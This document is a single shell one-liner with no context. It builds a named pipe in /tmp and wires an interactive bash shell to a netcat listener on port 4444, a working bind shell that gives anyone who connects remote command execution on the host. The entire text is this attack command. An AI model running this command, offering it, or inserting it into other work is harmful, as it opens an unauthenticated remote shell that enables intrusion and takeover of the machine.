rm /tmp/f11; mkfifo /tmp/f11; cat /tmp/f11 | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f11
